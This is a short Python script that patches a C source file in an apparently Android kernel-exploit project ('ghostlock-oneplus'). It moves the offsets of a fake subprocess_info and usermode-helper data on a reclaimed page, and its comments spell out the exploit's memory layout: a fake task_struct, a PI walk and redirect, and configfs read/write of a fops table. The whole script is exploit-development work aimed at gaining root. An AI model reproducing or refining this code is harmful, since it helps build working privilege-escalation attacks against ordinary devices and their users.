#!/usr/bin/env python3
import sys, os
CORE = os.path.expanduser("~/ghostlock/ghostlock-oneplus/src/core")
F = os.path.join(CORE, "umh_root.c")
s = open(F, encoding="utf-8").read()
old = """/* Page layout: fake subprocess_info and umh data on the reclaimed page.
 * These sit above the exploit structures (which end around 0x1800). */
#define UMH_WORK_OFF 0x2000
#define UMH_DATA_OFF 0x2080
"""
new = """/* Page layout: fake subprocess_info and umh data on the reclaimed page.
 * IMPORTANT: in this port page_base is a SINGLE 4 KB memfd page (not the
 * original order-3 32 KB slab), so the original 0x2000/0x2080 offsets wrote
 * ~0x400 bytes into arbitrary unrelated physical pages.  Place them at 0x400
 * instead: that region holds only the fake task_struct image, which is dead
 * after the PI walk/redirect (configfs R/W only touches the fops table at
 * 0x319 and the ashmem-name configfs_buffer).  Everything stays in-page. */
#define UMH_WORK_OFF 0x400
#define UMH_DATA_OFF 0x480
"""
if s.count(old) != 1:
    print("FAIL: %d occurrences" % s.count(old)); sys.exit(1)
open(F, "w", encoding="utf-8").write(s.replace(old, new))
print("ok")
